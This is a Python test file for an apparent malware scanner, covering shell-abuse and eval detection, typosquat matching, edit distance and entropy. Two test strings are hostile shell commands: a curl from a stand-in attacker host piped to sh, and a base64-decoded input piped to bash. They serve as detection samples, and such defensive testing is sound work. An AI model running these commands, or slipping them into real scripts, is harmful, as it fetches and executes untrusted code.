import re

from malwhunter.recon.catalog import (
    EVAL_FAMILY_CALL,
    SHELL_ABUSE_PATTERN,
    closest_typosquat_target,
    has_computed_arg,
    levenshtein,
    shannon_entropy,
)


def test_shell_abuse_pattern_matches_curl_pipe_sh():
    assert SHELL_ABUSE_PATTERN.search("curl http://evil.example/x.sh | sh")


def test_shell_abuse_pattern_matches_base64_decode_pipe_bash():
    assert SHELL_ABUSE_PATTERN.search("echo Zm9v | base64 -d | bash")


def test_shell_abuse_pattern_does_not_match_ordinary_install():
    assert not SHELL_ABUSE_PATTERN.search("node-gyp rebuild")
    assert not SHELL_ABUSE_PATTERN.search("npm run build")


def test_has_computed_arg_true_for_variable():
    m = EVAL_FAMILY_CALL.search("eval(decoded)")
    assert has_computed_arg(m) is True


def test_has_computed_arg_false_for_string_literal():
    m = EVAL_FAMILY_CALL.search('eval("1+1")')
    assert has_computed_arg(m) is False


def test_levenshtein_zero_for_identical():
    assert levenshtein("lodash", "lodash") == 0


def test_levenshtein_one_for_single_char_swap():
    assert levenshtein("lodash", "lodahs") == 2  # transposition costs 2 under simple edit distance


def test_closest_typosquat_target_flags_near_miss():
    assert closest_typosquat_target("lodashh") == "lodash"


def test_closest_typosquat_target_ignores_unrelated_name():
    assert closest_typosquat_target("my-companys-internal-utils") is None


def test_closest_typosquat_target_ignores_exact_popular_match():
    assert closest_typosquat_target("lodash") is None


def test_shannon_entropy_low_for_repetitive_text():
    assert shannon_entropy("aaaaaaaaaaaaaaaaaaaa") < 1.0


def test_shannon_entropy_high_for_base64_like_text():
    blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgZW50cm9weQ=="
    assert shannon_entropy(blob) > 3.5
